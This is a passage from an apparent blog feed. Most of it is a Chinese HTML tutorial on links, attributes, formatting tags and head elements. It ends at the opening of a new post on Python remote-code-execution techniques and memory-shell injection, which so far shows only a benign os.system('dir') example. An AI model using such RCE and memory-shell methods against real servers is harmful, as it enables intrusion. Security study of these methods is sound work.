元素都可以成为链接。</p><p><strong>文本链接：</strong>最常见的链接类型是文本链接，它使用 <a> 元素将一段文本转化为可点击的链接，例如：</a></p><pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com&quot;&gt;访问示例网站&lt;/a&gt;</code></pre><p><strong>图像链接：</strong>您还可以使用图像作为链接。在这种情况下，<a> 元素包围着 <img> 元素。例如：</a></p><pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com&quot;&gt;  &lt;img src=&quot;example.jpg&quot; alt=&quot;示例图片&quot;&gt;&lt;/a&gt;</code></pre><p><strong>锚点链接：</strong>除了链接到其他网页外，您还可以在同一页面内创建内部链接，这称为锚点链接。要创建锚点链接，需要在目标位置使用 <a> 元素定义一个标记，并使用#符号引用该标记。例如：</a></p><pre><code class="highlight plaintext">&lt;a href=&quot;#section2&quot;&gt;跳转到第二部分&lt;/a&gt;&lt;!-- 在页面中的某个位置 --&gt;&lt;a name=&quot;section2&quot;&gt;&lt;/a&gt;</code></pre><p><strong>下载链接：</strong>如果您希望链接用于下载文件而不是导航到另一个网页，可以使用 download 属性。例如：</p><pre><code class="highlight plaintext">&lt;a href=&quot;document.pdf&quot; download&gt;下载文档&lt;/a&gt;</code></pre><hr><h4 id="HTML-链接-target-属性"><a href="#HTML-链接-target-属性" class="headerlink" title="HTML 链接 - target 属性"></a>HTML 链接 - target 属性</h4><p>使用 target 属性，你可以定义被链接的文档在何处显示。</p><p>下面的这行会在新窗口打开文档：</p><ul><li>实例</li></ul><pre><code class="highlight plaintext">&lt;a href=&quot;https://www.runoob.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;访问菜鸟教程!&lt;/a&gt;</code></pre><hr><h4 id="HTML-链接-id-属性"><a href="#HTML-链接-id-属性" class="headerlink" title="HTML 链接- id 属性"></a>HTML 链接- id 属性</h4><p>id 属性可用于创建一个 HTML 文档书签。</p><p><strong>提示:</strong> 书签不会以任何特殊方式显示，即在 HTML 页面中是不显示的，所以对于读者来说是隐藏的。</p><ul><li>实例</li></ul><p>在HTML文档中插入ID:</p><pre><code class="highlight plaintext">&lt;a id=&quot;tips&quot;&gt;有用的提示部分&lt;/a&gt;</code></pre><p>在HTML文档中创建一个链接到”有用的提示部分(id&#x3D;”tips”）”：</p><pre><code class="highlight plaintext">&lt;a href=&quot;#tips&quot;&gt;访问有用的提示部分&lt;/a&gt;</code></pre><p>或者，从另一个页面创建一个链接到”有用的提示部分(id&#x3D;”tips”）”：</p><pre><code class="highlight plaintext">&lt;a href=&quot;https://www.runoob.com/html/html-links.html#tips&quot;&gt;访问有用的提示部分&lt;/a&gt;</code></pre><hr><h4 id="空链接"><a href="#空链接" class="headerlink" title="空链接"></a>空链接</h4><p>以下是常见的几种设置空链接的方法，以及它们之间的区别：</p><table><thead><tr><th align="left">方法</th><th align="left">作用</th><th align="left">是否会跳转</th><th align="left">场景适用性</th></tr></thead><tbody><tr><td align="left"><code>href=&quot;#&quot;</code></td><td align="left">导航到页面顶部</td><td align="left">是</td><td align="left">占位符，捕获点击事件</td></tr><tr><td align="left"><code>href=&quot;javascript:void(0)&quot;</code></td><td align="left">阻止默认行为，不刷新页面</td><td align="left">否</td><td align="left">阻止跳转，配合 JS 使用</td></tr><tr><td align="left"><code>href=&quot;&quot;</code></td><td align="left">刷新当前页面</td><td align="left">是</td><td align="left">需要页面刷新时</td></tr><tr><td align="left"><code>href=&quot;about:blank&quot;</code></td><td align="left">打开空白页面</td><td align="left">是</td><td align="left">新窗口打开空白页面</td></tr><tr><td align="left"><code>role=&quot;button&quot;</code></td><td align="left">链接表现为按钮，无默认行为</td><td align="left">否</td><td align="left">配合 JS 实现按钮功能，无跳转</td></tr></tbody></table><hr><h4 id="基本的注意事项-有用的提示"><a href="#基本的注意事项-有用的提示" class="headerlink" title="基本的注意事项 - 有用的提示"></a>基本的注意事项 - 有用的提示</h4><p><strong>注释：</strong> 请始终将正斜杠添加到子文件夹。假如这样书写链接：href&#x3D;”<a href="https://www.runoob.com/html%22%EF%BC%8C%E5%B0%B1%E4%BC%9A%E5%90%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BA%A7%E7%94%9F%E4%B8%A4%E6%AC%A1">https://www.runoob.com/html&quot;，就会向服务器产生两次</a> HTTP 请求。这是因为服务器会添加正斜杠到这个地址，然后创建一个新的请求，就像这样：href&#x3D;”<a href="https://www.runoob.com/html/%22%E3%80%82">https://www.runoob.com/html/&quot;。</a></p><h3 id="HTML-图像"><a href="#HTML-图像" class="headerlink" title="HTML 图像"></a><strong>HTML 图像</strong></h3><p>HTML 图像是通过标签 <code>&lt;img&gt; </code>来定义的.</p><ul><li>实例</li></ul><pre><code class="highlight plaintext">&lt;img src=&quot;images/logo.png&quot; width=&quot;258&quot; height=&quot;39&quot; /&gt;</code></pre><p><strong>注意：</strong> 图像的名称和尺寸是以属性的形式提供的。</p><h3 id="HTML换行"><a href="#HTML换行" class="headerlink" title="HTML换行"></a><strong>HTML换行</strong></h3><p>HTML换行是通过<code>&lt;br&gt;</code> 来定义的</p><p>如果您希望在不产生一个新段落的情况下进行换行（新行），请使用 <code>&lt;br&gt;</code> 标签：</p><ul><li>实例</li></ul><pre><code class="highlight html"><span class="tag">&lt;<span class="name">p</span>&gt;</span>这个<span class="tag">&lt;<span class="name">br</span>&gt;</span>段落<span class="tag">&lt;<span class="name">br</span>&gt;</span>演示了分行的效果<span class="tag">&lt;/<span class="name">p</span>&gt;</span></code></pre><p><code>&lt;br /&gt;</code> 元素是一个空的 HTML 元素。由于关闭标签没有任何意义，因此它没有结束标签。</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250316094200892.png" alt="image-20250316094200892"></p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250316094136106.png" alt="image-20250316094136106"></p><pre><code class="highlight plaintext">区分一下： &lt;br&gt;, &lt;br/&gt; 以及 &lt;br /&gt;（带有空格）&lt;br&gt; 是 HTML 写法。&lt;br/&gt;是 XHTML1.1 的写法, 也是 XML 写法。&lt;br /&gt; 是 XHTML 为兼容 HTML 的写法,也是 XML 写法。HTML5 因为兼容 XHTML，所以三种写法都可以使用。早期发布的 HTML 规范当中，&lt;br&gt; 与 &lt;img&gt; 等元素是不用封闭自身的，但是这种元素造成了 HTML 规范的不严谨，于是在之后发布的 XHTML 语言中，参考了更为严谨的 XML 规范，在这些不用自身封闭的元素后加 / 来表示自行封闭，在逻辑上来讲等同于&lt;br&gt;....&lt;/br&gt;（但是没有 &lt;/br&gt; 这种写法），这样一来保证了较少的代码量，二来保证了规范的严谨。</code></pre><h3 id="HTML-空元素"><a href="#HTML-空元素" class="headerlink" title="HTML 空元素"></a><strong>HTML 空元素</strong></h3><p>没有内容的 HTML 元素被称为空元素。空元素是在开始标签中关闭的。</p><p><code>&lt;br&gt;</code> 就是没有关闭标签的空元素（<code>&lt;br&gt;</code> 标签定义换行）。</p><p>在 XHTML、XML 以及未来版本的 HTML 中，所有元素都必须被关闭。</p><p>在开始标签中添加斜杠，比如<code> &lt;br /&gt;</code>，是关闭空元素的正确方法，HTML、XHTML 和 XML 都接受这种方式。</p><p>即使<code> &lt;br&gt;</code> 在所有浏览器中都是有效的，但使用 <code>&lt;br /&gt;</code> 其实是更长远的保障。</p><blockquote><p>[!TIP]</p><p>即使忘记使用结束标签，大部分浏览器也会正确地显示HTML，但是依赖这种做法(指不要当懒狗)，最好闭合一下标签，忘记使用结束标签会产生不可预料的结果或错误</p></blockquote><p><strong>tip</strong>：可以的话建议使用小写标签</p><h2 id="HTML属性"><a href="#HTML属性" class="headerlink" title="HTML属性"></a>HTML属性</h2><p>属性是 HTML 元素提供的附加信息。</p><p>属性通常出现在 HTML 标签的开始标签中，用于定义元素的行为、样式、内容或其他特性。</p><p>属性总是以 <strong>name&#x3D;”value”</strong> 的形式写在标签内，<strong>name</strong> 是属性的名称，<strong>value</strong> 是属性的值。</p><hr><p><strong>HTML 属性</strong></p><ul><li>HTML 元素可以设置<strong>属性</strong></li><li>属性可以在元素中添加<strong>附加信息</strong></li><li>属性一般描述于<strong>开始标签</strong></li><li>属性总是以名称&#x2F;值对的形式出现，**比如：name&#x3D;”value”**。</li></ul><hr><p>属性实例</p><p>HTML 链接由 <a> 标签定义。链接的地址在 <strong>href 属性</strong>中指定：</a></p><p>实例</p><pre><code class="highlight plaintext">&lt;a href=&quot;http://www.runoob.com&quot;&gt;这是一个链接&lt;/a&gt;</code></pre><hr><p><strong>HTML 属性常用引用属性值</strong></p><p>属性值应该始终被包括在引号内。</p><p>双引号是最常用的，不过使用单引号也没有问题。</p><p>使用双引号：</p><pre><code class="highlight plaintext">&lt;a href=&quot;https://www.runoob.com&quot;&gt;Link&lt;/a&gt;</code></pre><p>使用单引号：</p><pre><code class="highlight plaintext">&lt;a href=&#x27;https://www.runoob.com&#x27;&gt;Link&lt;/a&gt;</code></pre><p>属性值包含引号： <code>Link</code></p><blockquote><p><strong>提示:</strong> 在某些个别的情况下，比如属性值本身就含有双引号，那么您必须使用单引号，例如：</p><pre><code class="highlight plaintext">name=&#x27;John &quot;ShotGun&quot; Nelson&#x27;</code></pre><p>或者：</p><pre><code class="highlight plaintext">&lt;a href=&quot;https://www.runoob.com?q=&#x27;search&#x27;&quot;&gt;Link&lt;/a&gt;</code></pre></blockquote><hr><p><strong>HTML 提示：使用小写属性</strong></p><p>属性和属性值对大小写不敏感。</p><p>不过，万维网联盟在其 HTML 4 推荐标准中推荐小写的属性&#x2F;属性值。</p><p>而新版本的 (X)HTML 要求使用小写属性。</p><hr><p><strong>HTML 属性参考手册</strong></p><p>查看完整的HTML属性列表: <a href="https://www.runoob.com/tags/html-reference.html">HTML 标签参考手册</a>。</p><p>下面列出了适用于大多数 HTML 元素的属性：</p><table><thead><tr><th align="left">属性名</th><th align="left">适用元素</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left"><code>id</code></td><td align="left">所有元素</td><td align="left">为元素指定唯一的标识符。</td></tr><tr><td align="left"><code>class</code></td><td align="left">所有元素</td><td align="left">为元素指定一个或多个类名，用于 CSS 或 JavaScript 选择。</td></tr><tr><td align="left"><code>style</code></td><td align="left">所有元素</td><td align="left">直接在元素上应用 CSS 样式。</td></tr><tr><td align="left"><code>title</code></td><td align="left">所有元素</td><td align="left">为元素提供额外的提示信息，通常在鼠标悬停时显示。</td></tr><tr><td align="left"><code>data-*</code></td><td align="left">所有元素</td><td align="left">用于存储自定义数据，通常通过 JavaScript 访问。</td></tr><tr><td align="left"><code>href</code></td><td align="left"><code>&lt;a&gt;</code>, <code>&lt;link&gt;</code></td><td align="left">指定链接的目标 URL。</td></tr><tr><td align="left"><code>src</code></td><td align="left"><code>&lt;img&gt;</code>, <code>&lt;script&gt;</code>, <code>&lt;iframe&gt;</code></td><td align="left">指定外部资源（如图片、脚本、框架）的 URL。</td></tr><tr><td align="left"><code>alt</code></td><td align="left"><code>&lt;img&gt;</code></td><td align="left">为图像提供替代文本，当图像无法显示时显示。</td></tr><tr><td align="left"><code>type</code></td><td align="left"><code>&lt;input&gt;</code>, <code>&lt;button&gt;</code></td><td align="left">指定输入控件的类型（如 <code>text</code>, <code>password</code>, <code>checkbox</code> 等）。</td></tr><tr><td align="left"><code>value</code></td><td align="left"><code>&lt;input&gt;</code>, <code>&lt;button&gt;</code>, <code>&lt;option&gt;</code></td><td align="left">指定元素的初始值。</td></tr><tr><td align="left"><code>disabled</code></td><td align="left">表单元素</td><td align="left">禁用元素，使其不可交互。</td></tr><tr><td align="left"><code>checked</code></td><td align="left"><code>&lt;input type=&quot;checkbox&quot;&gt;</code>, <code>&lt;input type=&quot;radio&quot;&gt;</code></td><td align="left">指定复选框或单选按钮是否被选中。</td></tr><tr><td align="left"><code>placeholder</code></td><td align="left"><code>&lt;input&gt;</code>, <code>&lt;textarea&gt;</code></td><td align="left">在输入框中显示提示文本。</td></tr><tr><td align="left"><code>target</code></td><td align="left"><code>&lt;a&gt;</code>, <code>&lt;form&gt;</code></td><td align="left">指定链接或表单提交的目标窗口或框架（如 <code>_blank</code> 表示新标签页）。</td></tr><tr><td align="left"><code>readonly</code></td><td align="left">表单元素</td><td align="left">使输入框只读。</td></tr><tr><td align="left"><code>required</code></td><td align="left">表单元素</td><td align="left">指定输入字段为必填项。</td></tr><tr><td align="left"><code>autoplay</code></td><td align="left"><code>&lt;audio&gt;</code>, <code>&lt;video&gt;</code></td><td align="left">自动播放媒体。</td></tr><tr><td align="left"><code>onclick</code></td><td align="left">所有元素</td><td align="left">当用户点击元素时触发 JavaScript 事件。</td></tr><tr><td align="left"><code>onmouseover</code></td><td align="left">所有元素</td><td align="left">当用户将鼠标悬停在元素上时触发 JavaScript 事件。</td></tr><tr><td align="left"><code>onchange</code></td><td align="left">表单元素</td><td align="left">当元素的值发生变化时触发 JavaScript 事件。</td></tr></tbody></table><h3 id="全局属性"><a href="#全局属性" class="headerlink" title="全局属性"></a>全局属性</h3><p>全局属性是所有 HTML 元素都可以使用的属性。</p><p><strong>id</strong>：为元素指定唯一的标识符。(基于<code>css</code>的属性,纯粹使用&lt; DIV &gt;标签而不加任何CSS内容，其效果与用&lt; p&gt;&lt; &#x2F;p &gt;是一样的。)</p><pre><code class="highlight plaintext">&lt;div id=&quot;header&quot;&gt;This is the header&lt;/div&gt;</code></pre><p><strong>class</strong>：为元素指定一个或多个类名，用于 CSS 或 JavaScript 选择。</p><pre><code class="highlight plaintext">&lt;p class=&quot;text highlight&quot;&gt;This is a highlighted text.&lt;/p&gt;</code></pre><p><strong>style</strong>：用于直接在元素上应用 CSS 样式。</p><pre><code class="highlight plaintext">&lt;p style=&quot;color: blue; font-size: 14px;&quot;&gt;This is a styled paragraph.&lt;/p&gt;</code></pre><p><strong>title</strong>：为元素提供额外的提示信息，通常在鼠标悬停时显示。</p><pre><code class="highlight plaintext">&lt;abbr title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/abbr&gt;</code></pre><p>**data-***：用于存储自定义数据，通常通过 JavaScript 访问。</p><pre><code class="highlight plaintext">&lt;div data-user-id=&quot;12345&quot;&gt;User Info&lt;/div&gt;</code></pre><h3 id="特定元素的属性"><a href="#特定元素的属性" class="headerlink" title="特定元素的属性"></a>特定元素的属性</h3><p>某些属性仅适用于特定的 HTML 元素。</p><p>**<code>href</code>**（用于 <code>&lt;a&gt;</code> 和 <code>&lt;link&gt;</code> 元素）：指定链接的目标 URL。</p><pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com&quot;&gt;Visit Example&lt;/a&gt;</code></pre><p>**<code>src</code>**（用于 <code>&lt;img&gt;</code>, <code>&lt;script&gt;</code>, <code>&lt;iframe&gt;</code> 等元素）：指定外部资源的 URL。</p><pre><code class="highlight plaintext">&lt;img src=&quot;image.jpg&quot; alt=&quot;An example image&quot;&gt;</code></pre><p>**<code>alt</code>**（用于 <code>&lt;img&gt;</code> 元素）：为图像提供替代文本，当图像无法显示时显示。</p><pre><code class="highlight plaintext">&lt;img src=&quot;image.jpg&quot; alt=&quot;An example image&quot;&gt;</code></pre><p>**<code>type</code>**（用于 <code>&lt;input&gt;</code> 和 <code>&lt;button&gt;</code> 元素）：指定输入控件的类型。</p><pre><code class="highlight plaintext">&lt;input type=&quot;text&quot; placeholder=&quot;Enter your name&quot;&gt;</code></pre><p>**<code>value</code>**（用于 <code>&lt;input&gt;</code>, <code>&lt;button&gt;</code>, <code>&lt;option&gt;</code> 等元素）：指定元素的初始值。</p><pre><code class="highlight plaintext">&lt;input type=&quot;text&quot; value=&quot;Default Value&quot;&gt;</code></pre><p>**<code>disabled</code>**（用于表单元素）：禁用元素，使其不可交互。</p><pre><code class="highlight plaintext">&lt;input type=&quot;text&quot; disabled&gt;</code></pre><p>**<code>checked</code>**（用于 <code>&lt;input type=&quot;checkbox&quot;&gt;</code> 和 <code>&lt;input type=&quot;radio&quot;&gt;</code>）：指定复选框或单选按钮是否被选中。</p><pre><code class="highlight plaintext">&lt;input type=&quot;checkbox&quot; checked&gt;</code></pre><p>**<code>placeholder</code>**（用于 <code>&lt;input&gt;</code> 和 <code>&lt;textarea&gt;</code> 元素）：在输入框中显示提示文本。</p><pre><code class="highlight plaintext">&lt;input type=&quot;text&quot; placeholder=&quot;Enter your email&quot;&gt;</code></pre><p>**<code>target</code>**（用于 <code>&lt;a&gt;</code> 和 <code>&lt;form&gt;</code> 元素）：指定链接或表单提交的目标窗口或框架。</p><pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com&quot; target=&quot;_blank&quot;&gt;Open in new tab&lt;/a&gt;</code></pre><h3 id="布尔属性"><a href="#布尔属性" class="headerlink" title="布尔属性"></a>布尔属性</h3><p>布尔属性是指不需要值的属性，它们的存在即表示 true，不存在则表示 false。</p><p><strong>disabled</strong>：禁用元素。</p><pre><code class="highlight plaintext">&lt;input type=&quot;text&quot; disabled&gt;</code></pre><p><strong>readonly</strong>：使输入框只读。</p><pre><code class="highlight plaintext">&lt;input type=&quot;text&quot; readonly&gt;</code></pre><p><strong>required</strong>：指定输入字段为必填项。</p><pre><code class="highlight plaintext">&lt;input type=&quot;text&quot; required&gt;</code></pre><p>**<code>autoplay</code>**（用于 <code>&lt;audio&gt;</code> 和 <code>&lt;video&gt;</code> 元素）：自动播放媒体。</p><pre><code class="highlight plaintext">&lt;video src=&quot;video.mp4&quot; autoplay&gt;&lt;/video&gt;</code></pre><h3 id="自定义属性"><a href="#自定义属性" class="headerlink" title="自定义属性"></a>自定义属性</h3><p>HTML5 引入了 <strong>data-*</strong> 属性，允许开发者自定义属性来存储额外的数据。</p><p>**data-***：用于存储自定义数据，通常通过 JavaScript 访问。</p><pre><code class="highlight plaintext">&lt;div data-user-id=&quot;12345&quot; data-role=&quot;admin&quot;&gt;User Info&lt;/div&gt;</code></pre><h3 id="事件处理属性"><a href="#事件处理属性" class="headerlink" title="事件处理属性"></a>事件处理属性</h3><p>HTML 元素可以通过事件处理属性来响应特定的事件，如点击、鼠标悬停等。</p><p><strong>onclick</strong>：当用户点击元素时触发。</p><pre><code class="highlight plaintext">&lt;button onclick=&quot;alert(&#x27;Button clicked!&#x27;)&quot;&gt;Click Me&lt;/button&gt;</code></pre><p><strong>onmouseover</strong>：当用户将鼠标悬停在元素上时触发。</p><pre><code class="highlight plaintext">&lt;div onmouseover=&quot;this.style.backgroundColor=&#x27;yellow&#x27;&quot;&gt;Hover over me&lt;/div&gt;</code></pre><p><strong>onchange</strong>：当元素的值发生变化时触发。</p><pre><code class="highlight plaintext">&lt;input type=&quot;text&quot; onchange=&quot;alert(&#x27;Value changed!&#x27;)&quot;&gt;</code></pre><h2 id="为网页加亿点点细节"><a href="#为网页加亿点点细节" class="headerlink" title="为网页加亿点点细节"></a>为网页加亿点点细节</h2><h3 id="水平线"><a href="#水平线" class="headerlink" title="水平线"></a>水平线</h3><p><code>&lt;hr&gt;</code> 标签在 HTML 页面中创建水平线。</p><p><code>hr </code>元素可用于分隔内容。</p><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>可以将注释插入 HTML 代码中，这样可以提高其可读性，使代码更易被人理解。浏览器会忽略注释，也不会显示它们。</p><p>注释写法如下:</p><ul><li>实例</li></ul><!-- 这是一个注释 --><p><strong>注释:</strong> 开始括号之后（左边的括号）需要紧跟一个叹号 <strong>!</strong> (英文标点符号)，结束括号之前（右边的括号）不需要，合理地使用注释可以对未来的代码编辑工作产生帮助。</p><h3 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h3><h4 id="HTML-文本格式化标签"><a href="#HTML-文本格式化标签" class="headerlink" title="HTML 文本格式化标签"></a>HTML 文本格式化标签</h4><table><thead><tr><th align="left">标签</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><b></b></td><td align="left">定义粗体文本</td></tr><tr><td align="left"><em>(大号斜体)</em></td><td align="left">定义着重文字</td></tr><tr><td align="left"><i></i></td><td align="left">定义斜体字</td></tr><tr><td align="left"><small></small></td><td align="left">定义小号字</td></tr><tr><td align="left"><strong>(加粗)</strong></td><td align="left">定义加重语气</td></tr><tr><td align="left"><sub></sub></td><td align="left">定义下标字</td></tr><tr><td align="left"><sup></sup></td><td align="left">定义上标字</td></tr><tr><td align="left"><ins>(下划线)</ins></td><td align="left">定义插入字</td></tr><tr><td align="left"><del>(横线)</del></td><td align="left">定义删除字</td></tr></tbody></table><h4 id="HTML-“计算机输出”-标签"><a href="#HTML-“计算机输出”-标签" class="headerlink" title="HTML “计算机输出” 标签"></a>HTML “计算机输出” 标签</h4><table><thead><tr><th align="left">标签</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><code></code></td><td align="left">定义计算机代码</td></tr><tr><td align="left"><kbd></kbd></td><td align="left">定义键盘码</td></tr><tr><td align="left"><samp></samp></td><td align="left">定义计算机代码样本</td></tr><tr><td align="left"><var></var></td><td align="left">定义变量</td></tr><tr><td align="left"><pre></pre></td><td align="left">定义预格式文本</td></tr></tbody></table><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250316125805549.png" alt="image-20250316125805549"></p><h4 id="HTML-引文-引用-及标签定义"><a href="#HTML-引文-引用-及标签定义" class="headerlink" title="HTML 引文, 引用, 及标签定义"></a>HTML 引文, 引用, 及标签定义</h4><table><thead><tr><th align="left">标签</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><abdr><acronym></acronym></abdr></td><td align="left">定义缩写</td></tr><tr><td align="left"><address></address></td><td align="left">定义地址</td></tr><tr><td align="left"><bdo></bdo></td><td align="left">定义文字方向</td></tr><tr><td align="left"><blockquote></blockquote></td><td align="left">定义长的引用</td></tr><tr><td align="left"><q></q></td><td align="left">定义短的引用语</td></tr><tr><td align="left"><cite></cite></td><td align="left">定义引用、引证</td></tr><tr><td align="left"><dfn></dfn></td><td align="left">定义一个定义项目。</td></tr></tbody></table><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250316125715542.png" alt="image-20250316125715542"></p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250316132652922.png" alt="image-20250316132652922"></p><h2 id="HTML-头部"><a href="#HTML-头部" class="headerlink" title="HTML 头部"></a>HTML 头部</h2><h3 id="HTML-base-元素"><a href="#HTML-base-元素" class="headerlink" title="HTML base 元素"></a>HTML base 元素</h3><p><code>&lt;base&gt;</code> 标签描述了基本的链接地址/链接目标，该标签作为HTML文档中所有的链接标签的默认链接:</p><ul><li>实例</li></ul><pre><code class="highlight html"><span class="tag">&lt;<span class="name">head</span>&gt;</span> <span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;http://www.runoob.com/images/&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></code></pre><hr><h3 id="HTML-link-元素"><a href="#HTML-link-元素" class="headerlink" title="HTML  link 元素"></a>HTML  link 元素</h3><p><code>&lt;link&gt; </code>标签定义了文档与外部资源之间的关系。</p><p><code>&lt;link&gt; </code>标签通常用于链接到样式表:</p><p>可以在左侧显示logo等图片</p><ul><li>实例</li></ul><pre><code class="highlight html"><span class="tag">&lt;<span class="name">head</span>&gt;</span> <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">href</span>=<span class="string">&quot;图片url&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>这是一个带图片的标签<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></code></pre><pre><code class="highlight html"><span class="tag">&lt;<span class="name">head</span>&gt;</span> <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;mystyle.css&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></code></pre><hr><h3 id="HTML-style-元素"><a href="#HTML-style-元素" class="headerlink" title="HTML  style 元素"></a>HTML  style 元素</h3><p><code>&lt;style&gt;</code> 标签定义了HTML文档的样式文件引用地址.</p><p>在<code>&lt;style&gt; </code>元素中你也可以直接添加样式来渲染 HTML 文档:</p><ul><li>实例</li></ul><pre><code class="highlight html"><span class="tag">&lt;<span class="name">head</span>&gt;</span> <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"> </span><span class="language-css">    <span class="selector-tag">body</span> &#123;<span class="attribute">background-color</span>:yellow;&#125; </span><span class="language-css">    <span class="selector-tag">p</span> &#123;<span class="attribute">color</span>:blue&#125; </span><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></code></pre><hr><h3 id="HTML-meta-元素"><a href="#HTML-meta-元素" class="headerlink" title="HTML meta 元素"></a>HTML meta 元素</h3><p>meta标签描述了一些基本的元数据。</p><p><code>&lt;meta&gt; </code>标签提供了元数据.元数据也不显示在页面上，但会被浏览器解析。</p><p>META 元素通常用于指定网页的描述，关键词，文件的最后修改时间，作者，和其他元数据。</p><p>元数据可以使用于浏览器（如何显示内容或重新加载页面），搜索引擎（关键词），或其他Web服务。</p><p><code>&lt;meta&gt;</code> 一般放置于 <code>&lt;head&gt;</code> 区域</p><ul><li><code>&lt;meta&gt;</code> 标签- 使用实例</li></ul><p>为搜索引擎定义关键词:</p><pre><code class="highlight plaintext">&lt;meta name=&quot;keywords&quot; content=&quot;HTML, CSS, XML, XHTML, JavaScript&quot;&gt;</code></pre><p>为网页定义描述内容:</p><pre><code class="highlight plaintext">&lt;meta name=&quot;description&quot; content=&quot;免费 Web &amp; 编程 教程&quot;&gt;</code></pre><p>定义网页作者:</p><pre><code class="highlight plaintext">&lt;meta name=&quot;author&quot; content=&quot;Runoob&quot;&gt;</code></pre><p>每30秒钟刷新当前页面:</p><pre><code class="highlight plaintext">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;30&quot;&gt;</code></pre><hr><h3 id="HTML-script-元素"><a href="#HTML-script-元素" class="headerlink" title="HTML script 元素"></a>HTML script 元素</h3><pre><code class="highlight plaintext">&lt;script&gt;标签用于加载脚本文件，如： JavaScript。&lt;script&gt; 元素在以后的章节中会详细描述。</code></pre><hr><p><strong>总结:HTML head 元素</strong></p><table><thead><tr><th align="left">标签</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><head></head></td><td align="left">定义了文档的信息</td></tr><tr><td align="left"><title></title></td><td align="left">定义了文档的标题</td></tr><tr><td align="left"><base></td><td align="left">定义了页面链接标签的默认链接地址</td></tr><tr><td align="left"><link></td><td align="left">定义了一个文档和外部资源之间的关系</td></tr><tr><td align="left"><meta></td><td align="left">定义了HTML文档中的元数据</td></tr><tr><td align="left"><script></td><td align="left">定义了客户端的脚本文件</td></tr><tr><td align="left"><style></td><td align="left">定义了HTML文档的样式文件</td></tr></tbody></table><blockquote><p>[!IMPORTANT]</p></blockquote><p>head 标签用于定义文档头部，它是所有头部元素的容器。<head> 中的元素可以引用脚本、指示浏览器在哪里找到样式表、提供元信息等等。</p><p>如：</p><pre><code class="highlight plaintext">&lt;html&gt;  &lt;head&gt;     &lt;title&gt;文档标题&lt;/title&gt;  &lt;/head&gt;&lt;/html&gt;</code></pre><p>header 标签用于定义文档的页眉（介绍信息）。</p><p>如：</p><pre><code class="highlight plaintext">&lt;html&gt;  &lt;body&gt;    &lt;header&gt;        &lt;p&gt;段落&lt;/p&gt;        &lt;h1&gt;一级标题&lt;/h1&gt;    &lt;/header&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><p>注意千万不要弄混。</p></script></td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> -HTML -Web前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python的RCE姿势以及内存马注入</title>
      <link href="/2025/03/25/python%E7%9A%84RCE%E5%A7%BF%E5%8A%BF%E4%BB%A5%E5%8F%8A%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/"/>
      <url>/2025/03/25/python%E7%9A%84RCE%E5%A7%BF%E5%8A%BF%E4%BB%A5%E5%8F%8A%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="python的rce姿势以及内存马注入-未补完"><a href="#python的rce姿势以及内存马注入-未补完" class="headerlink" title="python的rce姿势以及内存马注入(未补完)"></a>python的rce姿势以及内存马注入(未补完)</h1><p>python的SSTI是明白的，可是如果是先渲染再接受参数呢?只传参不渲染又该如何面对呢</p><p>诶，注入一个内存马试试.?</p><h2 id="Python-的命令执行"><a href="#Python-的命令执行" class="headerlink" title="Python 的命令执行"></a>Python 的命令执行</h2><p>不同于php自带的命令执行函数，python是要先引入模块的，参考jinja2模板注入找os内置函数的那个过程</p><h3 id="OS模块"><a href="#OS模块" class="headerlink" title="OS模块"></a>OS模块</h3><p>经典款:</p><h4 id="os-system"><a href="#os-system" class="headerlink" title="os.system:"></a><code>os.system</code>:</h4><p>可以用来执行系统命令,但是无法将系统命令执行的结果返回.如果执行成功了会返回0,失败了会返回1</p><pre><code class="highlight python"><span class="keyword">import</span> osos.system(<span class="string">&#x27;dir&#x27;</span>)  //输出目录结构<span class="built_in">print</span>(os.system(<span class="string">&#x27;dir&#x27;</span>))  //输出目录结构,下一行输出<span class="number">0</span></code></pre><h4 id="os-popen"><a href="#os-popen" class="headerlink" 